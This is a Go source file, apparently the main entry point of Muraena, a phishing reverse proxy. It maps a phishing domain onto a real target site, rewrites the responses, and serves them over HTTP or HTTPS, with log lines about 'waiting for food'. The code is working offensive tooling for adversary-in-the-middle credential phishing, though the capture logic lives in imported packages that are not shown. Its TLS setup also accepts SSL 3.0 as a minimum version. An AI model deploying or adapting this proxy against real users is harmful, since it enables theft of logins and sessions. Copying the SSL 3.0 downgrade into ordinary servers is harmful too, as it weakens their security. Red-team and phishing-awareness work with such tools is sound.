package main

import (
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"net"
	"net/http"
	"os"
	"runtime"

	"github.com/muraenateam/muraena/core"
	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/module"
	"github.com/muraenateam/muraena/proxy"
	"github.com/muraenateam/muraena/session"

	"github.com/evilsocket/islazy/tui"
)

type TLSServer struct {
	http.Server
	Cert     string
	Key      string
	CertPool string
}

func (server *TLSServer) ServeTLS(addr string) (err error) {

	// In an ideal world everyone would use TLS 1.2 at least, but we downgrade to
	// accept SSL 3.0 as a minimum version, otherwise old clients will have issues
	conf := &tls.Config{
		MinVersion:               tls.VersionSSL30,
		PreferServerCipherSuites: true,
		SessionTicketsDisabled:   true,
		NextProtos:               []string{"http/1.1"},
		Certificates:             make([]tls.Certificate, 1),
	}

	conf.Certificates[0], err = tls.X509KeyPair([]byte(server.Cert), []byte(server.Key))
	if err != nil {
		return err
	}

	if server.CertPool != "" { // needed only for custom CAs
		certpool := x509.NewCertPool()
		if !certpool.AppendCertsFromPEM([]byte(server.CertPool)) {
			log.Error("Error handling certpool")
		}
		conf.ClientCAs = certpool
	}

	conn, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}

	tlsListener := tls.NewListener(conn, conf)
	return server.Serve(tlsListener)
}

func main() {

	sess, err := session.New()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	if !tui.Effects() {
		if *sess.Options.NoColors {
			fmt.Printf("\n\nWARNING: Terminal colors have been disabled, view will be very limited.\n\n")
		} else {
			fmt.Printf("\n\nWARNING: This terminal does not support colors, view will be very limited.\n\n")
		}
	}

	appName := fmt.Sprintf("%s v%s", core.Name, core.Version)
	appBuild := fmt.Sprintf("(built for %s %s with %s)", runtime.GOOS, runtime.GOARCH, runtime.Version())
	fmt.Printf("%s %s\n\n", tui.Bold(appName), tui.Dim(appBuild))

	// Initialize the Buffered Logging
	log.Init(sess.Config.Proxy.Log.Enabled, sess.Config.Proxy.Log.FilePath, sess.Config.Proxy.Log.BufferedLogDelay)

	// Load all modules
	module.LoadModules(sess)

	// Load replacer rules
	var replacer = &proxy.Replacer{
		Phishing:             sess.Config.Proxy.Phishing,
		Target:               sess.Config.Proxy.Target,
		ExternalOrigin:       sess.Config.Crawler.ExternalOrigins,
		ExternalOriginPrefix: sess.Config.Crawler.ExternalOriginPrefix,
		OriginsMapping:       sess.Config.Crawler.OriginsMapping,
		TBodyUniversal:       sess.Config.Proxy.Transform.Response.Body.Universal,
		TBodyCustom:          sess.Config.Proxy.Transform.Response.Body.Custom,
	}
	if err = replacer.DomainMapping(); err != nil {
		log.Fatal(err.Error())
	}
	replacer.MakeReplacements()

	//
	// Start the reverse proxy
	//
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		s := &proxy.SessionType{Session: sess, Replacer: replacer}
		s.HandleFood(w, r)
	})

	if sess.Config.TLS.Enabled {
		lline := fmt.Sprintf("Muraena Reverse Proxy waiting for food on HTTPS...\n[ %s ] ==> [ %s ]",
			tui.Yellow(sess.Config.Proxy.Phishing), tui.Green(sess.Config.Proxy.Target))
		log.Info(lline)
		log.BufLogInfo(lline)
		tlsServer := &TLSServer{
			Cert:     sess.Config.TLS.Certificate,
			Key:      sess.Config.TLS.Key,
			CertPool: sess.Config.TLS.Root,
		}

		if err := tlsServer.ServeTLS(fmt.Sprintf("%s:443", sess.Config.Proxy.Phishing)); err != nil {
			log.Fatal("Error binding Muraena on HTTPS: %s", err)
		}
	} else {
		muraena := &http.Server{Addr: fmt.Sprintf("%s:80", sess.Config.Proxy.Phishing)}
		lline := fmt.Sprintf("Muraena Reverse Proxy waiting for food on HTTP...\n[ %s ] ==> [ %s ]",
			tui.Yellow(sess.Config.Proxy.Phishing), tui.Green(sess.Config.Proxy.Target))
		log.Info(lline)
		log.BufLogInfo(lline)
		if err := muraena.ListenAndServe(); err != nil {
			log.Fatal("Error binding Muraena on HTTP: %s", err)
		}
	}
}
